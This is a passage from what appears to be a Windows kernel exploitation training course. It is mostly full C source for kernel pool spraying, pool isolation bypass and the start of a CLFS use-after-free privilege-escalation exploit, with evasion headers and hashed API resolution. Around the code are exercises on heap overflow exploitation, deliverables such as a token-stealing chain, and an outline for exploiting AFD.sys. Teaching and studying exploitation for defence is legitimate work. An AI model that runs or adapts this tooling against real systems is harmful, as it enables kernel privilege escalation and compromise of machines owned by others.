        sprayed++;
    }

    if (sprayed > 10) {
        UINT64 avg = totalTime / sprayed;
        for (DWORD i = 0; i < count; i++) {
            if (array[i].handle && array[i].allocTime > avg * 5) boundaries++;
        }
    }

    stats->count = count;
    stats->succeeded = sprayed;
    stats->avgTime = sprayed > 0 ? totalTime / sprayed : 0;
    stats->minTime = minTime;
    stats->maxTime = maxTime;
    stats->boundaryHits = boundaries;

    printf("    %d sprayed, avg %llu cycles, %d subsegment boundaries\n",
           sprayed, stats->avgTime, boundaries);
    return sprayed;
}

static DWORD SprayPipeBuffers(PPOOL_OBJECT array, DWORD count, DWORD bufSize,
                              SPRAY_STATS* stats) {
    printf("[*] Spraying %d pipe buffers (0x%X bytes, controlled content)...\n", count, bufSize);

    BYTE* marker = (BYTE*)malloc(bufSize);
    if (!marker) return 0;

    DWORD sprayed = 0;
    UINT64 totalTime = 0;
    UINT64 minTime = ~0ULL, maxTime = 0;
    DWORD boundaries = 0;

    for (DWORD i = 0; i < count; i++) {
        HANDLE hRead, hWrite;

        _mm_lfence();
        UINT64 start = __rdtsc();

        if (!CreatePipe(&hRead, &hWrite, NULL, bufSize)) {
            if (sprayed < 50) break;
            continue;
        }

        _mm_lfence();
        UINT64 elapsed = __rdtsc() - start;

        memset(marker, 0x50 + (i % 16), bufSize);
        if (bufSize >= sizeof(DWORD)) *(DWORD*)marker = i;

        DWORD written = 0;
        WriteFile(hWrite, marker, bufSize, &written, NULL);

        array[i].handle = hWrite;
        array[i].objectType = POOL_OBJ_PIPE;
        array[i].objectSize = bufSize;
        array[i].allocTime = elapsed;
        array[i].isHole = FALSE;

        totalTime += elapsed;
        if (elapsed < minTime) minTime = elapsed;
        if (elapsed > maxTime) maxTime = elapsed;
        sprayed++;

        CloseHandle(hRead);
    }

    if (sprayed > 10) {
        UINT64 avg = totalTime / sprayed;
        for (DWORD i = 0; i < count; i++) {
            if (array[i].handle && array[i].allocTime > avg * 5) boundaries++;
        }
    }

    free(marker);

    stats->count = count;
    stats->succeeded = sprayed;
    stats->avgTime = sprayed > 0 ? totalTime / sprayed : 0;
    stats->minTime = minTime;
    stats->maxTime = maxTime;
    stats->boundaryHits = boundaries;

    printf("    %d sprayed, avg %llu cycles, %d boundaries\n",
           sprayed, stats->avgTime, boundaries);
    return sprayed;
}

static DWORD CreateHoles(PPOOL_OBJECT array, DWORD count, DWORD pattern) {
    DWORD freed = 0;
    for (DWORD i = 0; i < count; i += pattern) {
        if (!array[i].handle || array[i].isHole) continue;

        if (array[i].objectType == POOL_OBJ_RESERVE ||
            array[i].objectType == POOL_OBJ_IOCP) {
            g_pfnNtClose(array[i].handle);
        } else {
            CloseHandle(array[i].handle);
        }
        array[i].handle = NULL;
        array[i].isHole = TRUE;
        freed++;
    }
    return freed;
}

static DWORD WidenHoles(PPOOL_OBJECT array, DWORD count, DWORD maxExtra) {
    DWORD freed = 0;
    for (DWORD i = 1; i < count - 1 && freed < maxExtra; i++) {
        if (!array[i].isHole && array[i-1].isHole && !array[i+1].isHole && array[i].handle) {
            if (array[i].objectType == POOL_OBJ_RESERVE ||
                array[i].objectType == POOL_OBJ_IOCP) {
                g_pfnNtClose(array[i].handle);
            } else {
                CloseHandle(array[i].handle);
            }
            array[i].handle = NULL;
            array[i].isHole = TRUE;
            freed++;
        }
    }
    return freed;
}

static void CleanupObjects(PPOOL_OBJECT array, DWORD count, const char* name) {
    DWORD freed = 0;
    for (DWORD i = 0; i < count; i++) {
        if (array[i].handle) {
            if (array[i].objectType == POOL_OBJ_RESERVE ||
                array[i].objectType == POOL_OBJ_IOCP) {
                g_pfnNtClose(array[i].handle);
            } else {
                CloseHandle(array[i].handle);
            }
            freed++;
        }
    }
    if (freed > 0) printf("    Freed %d %s\n", freed, name);
    free(array);
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    printf("=== Kernel Pool Feng Shui ===\n\n");

    g_pfnNtAllocateReserveObject = (pNtAllocateReserveObject_t)
        ResolveAPI(GetNtdllHandleFromPEB(), HashAPI("NtAllocateReserveObject"));
    g_pfnNtClose = (pNtClose_t)
        ResolveAPI(GetNtdllHandleFromPEB(), HashAPI("NtClose"));

    if (!g_pfnNtAllocateReserveObject || !g_pfnNtClose) {
        printf("[-] Failed to resolve NT APIs\n");
        return 1;
    }

    DWORD cpuCount = GetCPUCount();
    DWORD availMB = GetSystemMemoryMB();

    DWORD reserveCount, iocpCount, eventCount, semCount, pipeCount, pipeSize;
    DWORD holePattern = 10;

    if (availMB > 8192) {
        reserveCount = 5000; iocpCount = 3000; eventCount = 3000;
        semCount = 2000; pipeCount = 2000; pipeSize = 0x300;
    } else if (availMB > 4096) {
        reserveCount = 3000; iocpCount = 2000; eventCount = 2000;
        semCount = 1500; pipeCount = 1500; pipeSize = 0x200;
    } else {
        reserveCount = 2000; iocpCount = 1500; eventCount = 1500;
        semCount = 1000; pipeCount = 1000; pipeSize = 0x100;
    }

    printf("[*] %d cores, %u MB RAM\n", cpuCount, availMB);
    printf("[*] Reserve: %d, IOCP: %d, Event: %d, Semaphore: %d, Pipe: %d x 0x%X\n\n",
           reserveCount, iocpCount, eventCount, semCount, pipeCount, pipeSize);

    SetExploitPriority(1);

    PPOOL_OBJECT reserveArr = (PPOOL_OBJECT)calloc(reserveCount, sizeof(POOL_OBJECT));
    PPOOL_OBJECT iocpArr    = (PPOOL_OBJECT)calloc(iocpCount, sizeof(POOL_OBJECT));
    PPOOL_OBJECT eventArr   = (PPOOL_OBJECT)calloc(eventCount, sizeof(POOL_OBJECT));
    PPOOL_OBJECT semArr     = (PPOOL_OBJECT)calloc(semCount, sizeof(POOL_OBJECT));
    PPOOL_OBJECT pipeArr    = (PPOOL_OBJECT)calloc(pipeCount, sizeof(POOL_OBJECT));

    if (!reserveArr || !iocpArr || !eventArr || !semArr || !pipeArr) {
        printf("[-] Allocation failed\n");
        return 1;
    }

    printf("--- Phase 1: Pool Spray ---\n");
    SPRAY_STATS reserveStats = {0}, iocpStats = {0}, eventStats = {0};
    SPRAY_STATS semStats = {0}, pipeStats = {0};

    SprayObjects(reserveArr, reserveCount, POOL_OBJ_RESERVE, "IoCompletionReserve", 0x60, &reserveStats);
    SprayObjects(iocpArr, iocpCount, POOL_OBJ_IOCP, "IOCP", 0x48, &iocpStats);
    SprayObjects(eventArr, eventCount, POOL_OBJ_EVENT, "Event", 0x40, &eventStats);
    SprayObjects(semArr, semCount, POOL_OBJ_SEMAPHORE, "Semaphore", 0x48, &semStats);
    SprayPipeBuffers(pipeArr, pipeCount, pipeSize, &pipeStats);

    DWORD totalSprayed = reserveStats.succeeded + iocpStats.succeeded +
                         eventStats.succeeded + semStats.succeeded + pipeStats.succeeded;
    DWORD totalBoundaries = reserveStats.boundaryHits + iocpStats.boundaryHits +
                            eventStats.boundaryHits + semStats.boundaryHits + pipeStats.boundaryHits;

    printf("\n[+] Total: %d kernel objects, %d subsegment boundaries detected\n\n", totalSprayed, totalBoundaries);

    printf("--- Phase 2: Pool Feng Shui ---\n");

    DWORD reserveHoles = CreateHoles(reserveArr, reserveCount, holePattern);
    DWORD iocpHoles    = CreateHoles(iocpArr, iocpCount, holePattern);
    DWORD eventHoles   = CreateHoles(eventArr, eventCount, holePattern);
    DWORD semHoles     = CreateHoles(semArr, semCount, holePattern);
    DWORD pipeHoles    = CreateHoles(pipeArr, pipeCount, holePattern);
    DWORD totalHoles   = reserveHoles + iocpHoles + eventHoles + semHoles + pipeHoles;

    DWORD extraReserve = WidenHoles(reserveArr, reserveCount, reserveHoles / 10);
    DWORD extraIocp    = WidenHoles(iocpArr, iocpCount, iocpHoles / 10);
    totalHoles += extraReserve + extraIocp;

    DWORD remaining = totalSprayed - totalHoles;

    printf("[+] Freed %d objects (%.1f%%), %d remaining\n", totalHoles,
           (totalHoles * 100.0) / totalSprayed, remaining);
    printf("    Reserve: %d+%d holes, IOCP: %d+%d, Event: %d, Sem: %d, Pipe: %d\n",
           reserveHoles, extraReserve, iocpHoles, extraIocp, eventHoles, semHoles, pipeHoles);

    printf("\n--- Phase 3: Pool State Analysis ---\n");

    UINT64 avgAlloc = reserveStats.avgTime;
    float varianceRatio = (avgAlloc > 0) ?
        (float)(reserveStats.maxTime - reserveStats.minTime) / avgAlloc : 0;

    float boundaryDensity = (totalSprayed > 0) ?
        (totalBoundaries * 1000.0f) / totalSprayed : 0;

    float holeCoverage = (totalSprayed > 0) ?
        (totalHoles * 100.0f) / totalSprayed : 0;

    DWORD poolKB = (reserveStats.succeeded * 0x60 +
                    iocpStats.succeeded * 0x48 +
                    eventStats.succeeded * 0x40 +
                    semStats.succeeded * 0x48 +
                    pipeStats.succeeded * pipeSize) / 1024;

    printf("[*] Timing: avg %llu, min %llu, max %llu cycles\n",
           avgAlloc, reserveStats.minTime, reserveStats.maxTime);
    printf("[*] Variance ratio: %.1fx (lower = more consistent allocator)\n", varianceRatio);
    printf("[*] Subsegment boundary density: %.1f per 1000 allocs\n", boundaryDensity);
    printf("[*] Hole coverage: %.1f%% of pool freed\n", holeCoverage);
    printf("[*] Estimated kernel pool footprint: ~%d KB\n", poolKB);

    printf("\n[*] Assessment:\n");
    if (varianceRatio < 100 && holeCoverage > 8 && holeCoverage < 20) {
        printf("[+] Pool spray looks viable:\n");
        printf("    - Consistent allocation timing (sequential pool serving)\n");
        printf("    - Hole density %.1f%% - good for UAF/overflow target placement\n", holeCoverage);
        printf("    - %d subsegment boundaries across %d allocs\n", totalBoundaries, totalSprayed);
        printf("    NOTE: Actual adjacency cannot be verified from userland.\n");
        printf("    Pool layout must be confirmed via kernel debugger or info leak.\n");
    } else if (varianceRatio >= 100) {
        printf("[~] High timing variance (%.1fx) - pool may be fragmented\n", varianceRatio);
        printf("    Consider re-spraying or using fewer object types\n");
    } else {
        printf("[~] Hole coverage %.1f%% may be suboptimal\n", holeCoverage);
    }

    printf("\n[*] Cleaning up...\n");
    CleanupObjects(reserveArr, reserveCount, "reserve objects");
    CleanupObjects(iocpArr, iocpCount, "IOCP objects");
    CleanupObjects(eventArr, eventCount, "event objects");
    CleanupObjects(semArr, semCount, "semaphore objects");
    CleanupObjects(pipeArr, pipeCount, "pipe buffers");

    printf("\n[+] Done. Sprayed %d objects, created %d holes in kernel pool.\n", totalSprayed, totalHoles);
    return 0;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
cl src\kernel_pool_spray.c /Fe:bin\pool_spray.exe /O2 /I.\headers
.\bin\pool_spray.exe
```

### Pool Isolation Bypass

Windows 11 implements aggressive Pool Partitioning (separating pool objects by type) and Heap Isolation (per-module heaps). This prevents cross-type spraying (e.g., using pipe buffers to fill holes left by freed driver objects).

```c
// pool_isolation_bypass.c
// Compile: cl src\pool_isolation_bypass.c /Fe:bin\pool_bypass.exe /O2 /I.\headers

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"
#include "evasion.h"
#include "bypass.h"
#include "heap_utils.h"
#include <stdio.h>
#include <intrin.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pNtAllocateReserveObject_t)(PHANDLE, PVOID, DWORD);
typedef NTSTATUS (NTAPI *pNtClose_t)(HANDLE);
typedef NTSTATUS (NTAPI *pNtCreateSection_t)(PHANDLE, ACCESS_MASK, PVOID,
                                             PLARGE_INTEGER, ULONG, ULONG, HANDLE);

static pNtAllocateReserveObject_t g_NtAllocateReserveObject = NULL;
static pNtClose_t g_NtClose = NULL;
static pNtCreateSection_t g_NtCreateSection = NULL;

typedef struct _POOL_OBJECT {
    HANDLE handle;
    UINT64 allocTime;
    BYTE type; // 0=reserve, 1=event, 2=section, 3=window
} POOL_OBJECT;

static DWORD SprayReserveObjects(POOL_OBJECT* arr, DWORD count) {
    DWORD sprayed = 0;
    for (DWORD i = 0; i < count; i++) {
        NTSTATUS st = g_NtAllocateReserveObject(&arr[i].handle, NULL, 1);
        if (NT_SUCCESS(st)) {
            arr[i].type = 0;
            sprayed++;
        } else {
            arr[i].handle = NULL;
            if (sprayed < 100) break;
        }
    }
    return sprayed;
}

// Free every Nth object, return count freed
static DWORD FreeEveryNth(POOL_OBJECT* arr, DWORD count, DWORD pattern) {
    DWORD freed = 0;
    for (DWORD i = 0; i < count; i += pattern) {
        if (arr[i].handle) {
            g_NtClose(arr[i].handle);
            arr[i].handle = NULL;
            freed++;
        }
    }
    return freed;
}

// Measure refill timing for same-type objects (IoCompletionReserve)
// Returns: number sprayed, populates avgTime
static DWORD RefillSameType(POOL_OBJECT* arr, DWORD count, UINT64* avgTime) {
    DWORD sprayed = 0;
    UINT64 totalTime = 0;

    for (DWORD i = 0; i < count; i++) {
        _mm_lfence();
        UINT64 start = __rdtsc();
        NTSTATUS st = g_NtAllocateReserveObject(&arr[i].handle, NULL, 1);
        _mm_lfence();
        UINT64 elapsed = __rdtsc() - start;

        if (NT_SUCCESS(st)) {
            arr[i].allocTime = elapsed;
            arr[i].type = 0;
            totalTime += elapsed;
            sprayed++;
        } else {
            arr[i].handle = NULL;
        }
    }

    *avgTime = sprayed > 0 ? totalTime / sprayed : 0;
    return sprayed;
}

// Measure refill timing for cross-type objects (Events)
// If pool isolation works, these should NOT reuse IoCompletionReserve holes
static DWORD RefillCrossType(POOL_OBJECT* arr, DWORD count, UINT64* avgTime) {
    DWORD sprayed = 0;
    UINT64 totalTime = 0;

    for (DWORD i = 0; i < count; i++) {
        _mm_lfence();
        UINT64 start = __rdtsc();
        arr[i].handle = CreateEventA(NULL, TRUE, FALSE, NULL);
        _mm_lfence();
        UINT64 elapsed = __rdtsc() - start;

        if (arr[i].handle) {
            arr[i].allocTime = elapsed;
            arr[i].type = 1;
            totalTime += elapsed;
            sprayed++;
        }
    }

    *avgTime = sprayed > 0 ? totalTime / sprayed : 0;
    return sprayed;
}

// Cleanup helper
static void FreeAll(POOL_OBJECT* arr, DWORD count) {
    for (DWORD i = 0; i < count; i++) {
        if (!arr[i].handle) continue;
        if (arr[i].type == 0 || arr[i].type == 2)
            g_NtClose(arr[i].handle);
        else if (arr[i].type == 1)
            CloseHandle(arr[i].handle);
        else if (arr[i].type == 3)
            DestroyWindow((HWND)arr[i].handle);
    }
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    SetExploitPriority(1);

    g_NtAllocateReserveObject = (pNtAllocateReserveObject_t)
        ResolveAPI(GetNtdllHandleFromPEB(), HashAPI("NtAllocateReserveObject"));
    g_NtClose = (pNtClose_t)
        ResolveAPI(GetNtdllHandleFromPEB(), HashAPI("NtClose"));
    g_NtCreateSection = (pNtCreateSection_t)
        ResolveAPI(GetNtdllHandleFromPEB(), HashAPI("NtCreateSection"));

    if (!g_NtAllocateReserveObject || !g_NtClose || !g_NtCreateSection) {
        printf("[-] Failed to resolve NT APIs\n");
        return 1;
    }

    DWORD availMB = GetSystemMemoryMB();
    DWORD cores = GetCPUCount();

    DWORD sprayCount = (availMB > 8192) ? 10000 : (availMB > 4096) ? 7500 : 5000;
    DWORD holePattern = 8;
    DWORD holeCount = sprayCount / holePattern;

    printf("=== Pool Isolation Bypass ===\n");
    printf("[*] %u MB RAM, %d cores, spray: %d, holes: %d\n\n", availMB, cores, sprayCount, holeCount);
    printf("--- Step 1: Fill pool partition ---\n");
    POOL_OBJECT* spray = (POOL_OBJECT*)calloc(sprayCount, sizeof(POOL_OBJECT));
    POOL_OBJECT* fillA = (POOL_OBJECT*)calloc(holeCount, sizeof(POOL_OBJECT));
    POOL_OBJECT* fillB = (POOL_OBJECT*)calloc(holeCount, sizeof(POOL_OBJECT));

    if (!spray || !fillA || !fillB) {
        printf("[-] Allocation failed\n");
        return 1;
    }

    DWORD sprayed = SprayReserveObjects(spray, sprayCount);
    printf("[*] Sprayed %d IoCompletionReserve objects\n\n", sprayed);

    printf("--- Step 2: Create %d holes (every %d) ---\n", holeCount, holePattern);
    DWORD freed = FreeEveryNth(spray, sprayCount, holePattern);
    printf("[*] Freed %d objects\n\n", freed);

    printf("--- Step 3: Same-type refill (IoCompletionReserve) ---\n");
    UINT64 sameTypeAvg = 0;
    DWORD sameTypeFilled = RefillSameType(fillA, holeCount, &sameTypeAvg);
    printf("[*] Filled %d, avg timing: %llu cycles\n\n", sameTypeFilled, sameTypeAvg);

    FreeAll(fillA, holeCount);
    memset(fillA, 0, holeCount * sizeof(POOL_OBJECT));

    FreeAll(spray, sprayCount);
    memset(spray, 0, sprayCount * sizeof(POOL_OBJECT));
    sprayed = SprayReserveObjects(spray, sprayCount);
    freed = FreeEveryNth(spray, sprayCount, holePattern);

    printf("--- Step 4: Cross-type refill (Events into Reserve holes) ---\n");
    UINT64 crossTypeAvg = 0;
    DWORD crossTypeFilled = RefillCrossType(fillB, holeCount, &crossTypeAvg);
    printf("[*] Filled %d, avg timing: %llu cycles\n\n", crossTypeFilled, crossTypeAvg);

    printf("--- Step 5: Baseline (fresh IoCompletionReserve, no holes) ---\n");
    POOL_OBJECT baseline[100] = {0};
    UINT64 baselineAvg = 0;
    RefillSameType(baseline, 100, &baselineAvg);
    FreeAll(baseline, 100);
    printf("[*] Fresh allocation avg: %llu cycles\n\n", baselineAvg);

    printf("--- Results ---\n");
    printf("[*] Same-type refill (Reserve -> Reserve holes): %llu cycles avg\n", sameTypeAvg);
    printf("[*] Cross-type refill (Event -> Reserve holes):  %llu cycles avg\n", crossTypeAvg);
    printf("[*] Baseline (fresh alloc, no holes):            %llu cycles avg\n\n", baselineAvg);

    if (sameTypeAvg > 0 && crossTypeAvg > 0) {
        float ratio = (float)crossTypeAvg / (float)sameTypeAvg;
        printf("[*] Cross/Same ratio: %.2fx\n", ratio);

        if (sameTypeAvg < crossTypeAvg) {
            printf("[+] Same-type refill is FASTER than cross-type.\n");
            printf("    This indicates freed IoCompletionReserve chunks are reused\n");
            printf("    by new IoCompletionReserve allocs (same partition), but NOT\n");
            printf("    by Event allocs (different partition).\n");
            printf("[+] POOL ISOLATION CONFIRMED - and same-type bypass works.\n");
        } else if (sameTypeAvg > crossTypeAvg * 1.2f) {
            printf("[~] Cross-type was faster - pool isolation may not be active,\n");
            printf("    or the allocator behaves differently on this Windows version.\n");
        } else {
            printf("[~] Timings are similar - inconclusive from userland.\n");
            printf("    Pool isolation effects may be too subtle to measure via TSC.\n");
            printf("    Use kernel debugger (e.g., !pool, !poolfind) to verify.\n");
        }
    }

    printf("\n--- Bypass 2: Large Allocation ---\n");
    DWORD sectionCount = 200;
    POOL_OBJECT* sections = (POOL_OBJECT*)calloc(sectionCount, sizeof(POOL_OBJECT));
    DWORD sectionsSprayed = 0;

    if (sections) {
        for (DWORD i = 0; i < sectionCount; i++) {
            LARGE_INTEGER sz;
            sz.QuadPart = 0x2000;
            NTSTATUS st = g_NtCreateSection(&sections[i].handle, SECTION_ALL_ACCESS, NULL,
                                             &sz, PAGE_READWRITE, SEC_COMMIT, NULL);
            if (NT_SUCCESS(st)) {
                sections[i].type = 2;
                sectionsSprayed++;
            } else {
                sections[i].handle = NULL;
                if (sectionsSprayed < 20) break;
            }
        }
        printf("[*] Created %d section objects (0x2000 bytes each)\n", sectionsSprayed);
        printf("[*] Large allocations use different pool paths (Vs/LargePool),\n");
        printf("    bypassing type-based bucket partitioning.\n");
    }

    printf("\n--- Bypass 3: Session Pool ---\n");
    DWORD windowCount = 500;
    POOL_OBJECT* windows = (POOL_OBJECT*)calloc(windowCount, sizeof(POOL_OBJECT));
    DWORD windowsSprayed = 0;

    if (windows) {
        for (DWORD i = 0; i < windowCount; i++) {
            HWND hwnd = CreateWindowExA(0, "Button", "", WS_CHILD,
                                         0, 0, 1, 1, GetDesktopWindow(),
                                         NULL, NULL, NULL);
            if (hwnd) {
                windows[i].handle = (HANDLE)hwnd;
                windows[i].type = 3;
                windowsSprayed++;
            } else {
                if (windowsSprayed < 20) break;
            }
        }
        printf("[*] Created %d window objects (tagWND in session pool)\n", windowsSprayed);
        if (windowsSprayed > 0)
            printf("[*] Session pool is a separate pool domain from NonPagedPoolNx.\n");
        else
            printf("[!] Window creation failed - no GUI session.\n");
    }

    printf("\n--- Strategy ---\n");
    printf("[*] 1. Same-type spray: fill target partition with controlled objects\n");
    printf("[*] 2. Hole creation: selectively free to create reusable slots\n");
    printf("[*] 3. Trigger vuln: vulnerable alloc reuses a hole, neighbors are ours\n");
    printf("[*] 4. Large allocs / session pool: alternative vectors when type matching isn't possible\n");

    printf("\n[*] Cleaning up...\n");
    FreeAll(spray, sprayCount);
    FreeAll(fillA, holeCount);
    FreeAll(fillB, holeCount);
    if (sections) { FreeAll(sections, sectionCount); free(sections); }
    if (windows) { FreeAll(windows, windowCount); free(windows); }
    free(spray);
    free(fillA);
    free(fillB);

    printf("[+] Done.\n");
    return 0;
}
```

**Compile & Run:**

```bash
cd c:\Windows_Mitigations_Lab
cl src\pool_isolation_bypass.c /Fe:bin\pool_bypass.exe /O2 /I.\headers
.\bin\pool_bypass.exe
```

### Practical Exercise

#### Exercise 1: Implement LFH Timing Oracle

Complete the LFH timing side-channel to detect heap behavior and achieve controlled heap layout.

**Tasks:**

1. Implement heap type detection by measuring allocation scatter (>5 large gaps = Segment Heap)
2. Implement subsegment boundary detection using 5x average timing threshold
3. Implement four-phase grooming: spray → free ALL → every-other → refill
4. Implement physical adjacency analysis (20-allocation window, max distance size+0x30)
5. Test on Windows 11 and measure adjacency rate

**Success Criteria:**

- Heap type correctly identified (Segment Heap vs Legacy LFH)
- Timing variance and boundary count reported
- Physical adjacency analysis shows exploitable neighbors
- Assessment provides actionable exploitation guidance (>40% = viable, 25-40% = probabilistic, <25% = alternative approach)

#### Exercise 2: Heap Feng Shui with Real Overflow

Implement complete heap feng shui with actual overflow exploitation.

**Tasks:**

1. Implement adaptive spray configuration based on available memory
2. Implement four-phase grooming with timing and statistical analysis
3. Implement adjacency scoring (0-100 based on distance quality)
4. Implement real heap overflow: find adjacent pair, craft payload, trigger overflow, verify corruption
5. Measure success rate across multiple runs

**Success Criteria:**

- Spray count adapts to system memory (500-2000 allocations)
- Physical adjacency rate calculated correctly
- Overflow demonstration finds adjacent pair and corrupts target
- Marker byte verification confirms successful corruption
- Success rate assessment matches actual adjacency rate

### Key Takeaways

- **LFH Timing Side-Channel**: Heap type detection via allocation scatter (>5 gaps = Segment Heap), 5x average timing threshold for boundary detection, four-phase grooming (spray → free ALL → every-other → refill), physical adjacency analysis within 20-allocation window
- **Heap Feng Shui**: Adaptive spray counts (500-2000 based on memory), bucket alignment by freeing ALL allocations, every-other pattern with controlled refill, adjacency scoring (0-100 based on distance), real overflow demonstration with marker verification
- **Segment Heap**: VS allocations (0x100 bytes) with four-phase grooming, type confusion via callback pointer corruption, DEP bypass with VirtualProtect on heap region, test shellcode execution (returns 0x1337), LB allocations with guard page bypass
- **Pool Isolation Bypass**: Same-type refill faster than cross-type (confirms pool partitioning), timing ratio analysis (cross/same), large allocations bypass bucket partitioning, session pool as alternative vector
- **Kernel Pool Spraying**: Multi-primitive approach (Reserve 0x60, IOCP 0x48, Event 0x40, Semaphore 0x48, Pipe variable), every-Nth hole pattern (~10% coverage), hole widening (+10%), timing variance analysis (ratio <100 = consistent), boundary density per 1000 allocs
- **Realistic Exploitation**: Modern Windows requires probabilistic techniques, physical adjacency analysis (not sequential), adaptive strategies based on system resources, userland verification limited (kernel debugger needed for confirmation)

### Discussion Questions

1. How does heap type detection work? (Hint: Allocation scatter analysis - Segment Heap allocations come from different regions causing >5 large gaps, Legacy LFH more contiguous)
2. Why does "free ALL then reallocate" work better than "free every-other"? (Hint: Bucket alignment resets LFH state to known starting point, ensures controlled layout from clean slate)
3. What is physical vs sequential adjacency? (Hint: Sequential = consecutive array indices, Physical = any allocation within search window; addresses randomized in array order but physical neighbors exist)
4. How does pool isolation bypass work? (Hint: Same-type objects share partition so refill is faster, cross-type slower due to different partitions, timing ratio confirms isolation)
5. Why can't userland verify kernel pool adjacency? (Hint: No access to kernel memory layout, timing inference only, requires kernel debugger or information leak for confirmation)
6. What makes Segment Heap exploitation different? (Hint: Separate metadata storage, VS vs LB allocation paths, type confusion via callback corruption, DEP bypass needed for shellcode)
7. How do defenders detect heap feng shui? (Hint: Excessive allocations, abnormal spray counts, every-other free patterns, timing anomalies, handle count spikes)

## Day 4: Windows CLFS/KTM & AFD.sys Exploitation

- **Goal**: Learn exploitation of Windows CLFS, KTM, and AFD.sys

- **Activities**:
  - _Reading_:
    - [Introduction to CLFS](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-the-common-log-file-system)
    - [CLFS Internals](https://github.com/ionescu007/clfs-docs)
    - [CVE-2025-29824 Analysis](https://bi-zone.medium.com/deep-dive-into-cve-2025-29824-in-windows-8bc6d52dd028)
    - [AFD.sys Exploitation CVE-2025-32709](https://zeropath.com/blog/windows-afd-cve-2025-32709-use-after-free)
    - [Kernel Transaction Manager (KTM) Architecture](https://learn.microsoft.com/en-us/windows/win32/ktm/kernel-transaction-manager-portal)
  - _Lab Setup_:
    - Windows 11 24H2/25H2 VM
    - WinDbg with kernel debugging
    - CLFS log file manipulation tools
    - Vulnerable AFD.sys test environment
  - _Exercises_:
    1. CLFS log file manipulation
    2. Triggering CLFS UAF via racing
    3. Pool feng shui for CLFS exploitation
    4. AFD.sys heap-based buffer overflow exploitation
    5. KTM transaction object exploitation

### Deliverables

- [ ] Exploit CLFS UAF vulnerability (CVE-2025-style)
- [ ] Implement pool feng shui for reliable CLFS exploitation
- [ ] Exploit AFD.sys heap overflow
- [ ] Build complete CLFS -> token stealing chain

### CLFS Architecture and Exploitation

Common Log File System (CLFS) internals and Base Log File (BLF) structure exploitation. Actively exploited in 2025-2026 (CVE-2025-29824, CVE-2025-32701).

Exploit CLFS use-after-free for privilege escalation.

```c
// clfs_uaf_exploit.c
// BLF metadata corruption -> container context UAF -> pool overflow -> LPE
// Compile: cl src\clfs_uaf_exploit.c /Fe:bin\clfs_uaf.exe advapi32.lib clfsw32.lib /I.\headers
// Run: clfs_uaf.exe (requires Administrator)

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include <windows.h>
#include <stdio.h>
#include <clfs.h>
#include <clfsmgmt.h>
#include <clfsw32.h>
#include <winternl.h>
#include <intrin.h>
#include <time.h>

#pragma comment(lib, "clfsw32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

#ifndef ERROR_LOG_METADATA_CORRUPT
#define ERROR_LOG_METADATA_CORRUPT  6612L
#endif
#ifndef ERROR_LOG_METADATA_INVALID
#define ERROR_LOG_METADATA_INVALID  6613L
#endif
#ifndef ERROR_LOG_BLOCK_INVALID
#define ERROR_LOG_BLOCK_INVALID     6630L
#endif
#ifndef ERROR_LOG_SECTOR_INVALID
#define ERROR_LOG_SECTOR_INVALID    6600L
#endif

#include "exploit_common.h"
#include "exploit_utils.h"
#include "syscalls.h"
#include "kernel_utils.h"
#include "evasion.h"
#include "bypass.h"

#define SPRAY_COUNT      10000
#define PIPE_SPRAY_COUNT 2000
#define CLFS_SECTOR_SIZE 0x200
#define BLF_MAX_SIZE     (1024 * 1024)
#define LOG_RECORDS      50

typedef NTSTATUS (NTAPI *pNtAllocateReserveObject_t)(PHANDLE, PVOID, DWORD);
typedef NTSTATUS (NTAPI *pNtClose_t)(HANDLE);

static pNtAllocateReserveObject_t fnNtAllocateReserveObject = NULL;
static pNtClose_t fnNtClose = NULL;
static HANDLE g_sprayHandles[SPRAY_COUNT];
static HANDLE g_pipeRead[PIPE_SPRAY_COUNT];
static HANDLE g_pipeWrite[PIPE_SPRAY_COUNT];
static HANDLE g_hLog = INVALID_HANDLE_VALUE;
static PVOID  g_pvMarshal = NULL;
static DWORD  g_sprayedCount = 0;
static DWORD  g_pipesCreated = 0;
static KERNEL_OFFSETS g_Offsets = {0};

static int g_corruptedPipeIdx = -1;

BOOL KernelRead32(DWORD64 address, PDWORD outValue) {
    if (g_corruptedPipeIdx < 0) return FALSE;
    // Real implementation: write target address to corrupted pipe attribute,
    // then read back through the pipe to get kernel memory contents.
    // This requires the overflow to have corrupted a pipe's internal pointers.
    (void)address; *outValue = 0;
    return FALSE;
}

BOOL KernelRead64(DWORD64 address, PDWORD64 outValue) {
    DWORD lo = 0, hi = 0;
    if (!KernelRead32(address, &lo) || !KernelRead32(address + 4, &hi)) return FALSE;
    *outValue = ((DWORD64)hi << 32) | lo;
    return TRUE;
}

BOOL KernelWrite32(DWORD64 address, DWORD value) {
    if (g_corruptedPipeIdx < 0) return FALSE;
    (void)address; (void)value;
    return FALSE;
}

BOOL KernelWrite64(DWORD64 address, DWORD64 value) {
    return KernelWrite32(address, (DWORD)(value & 0xFFFFFFFF)) &&
           KernelWrite32(address + 4, (DWORD)(value >> 32));
}

static BOOL ResolveAPIs() {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    fnNtAllocateReserveObject = (pNtAllocateReserveObject_t)
        ResolveAPI(hNtdll, HashAPI("NtAllocateReserveObject"));
    fnNtClose = (pNtClose_t)ResolveAPI(hNtdll, HashAPI("NtClose"));
    return fnNtAllocateReserveObject && fnNtClose;
}

static BOOL CreateAndPopulateLog(LPCWSTR logPath, LPCWSTR containerPath) {
    printf("[*] Creating CLFS log: %S\n", logPath);
    WCHAR blfPath[MAX_PATH];
    LPCWSTR rawPath = (wcsncmp(logPath, L"log:", 4) == 0) ? logPath + 4 : logPath;
    swprintf_s(blfPath, MAX_PATH, L"%s.blf", rawPath);
    DeleteFileW(blfPath);
    DeleteFileW(containerPath);

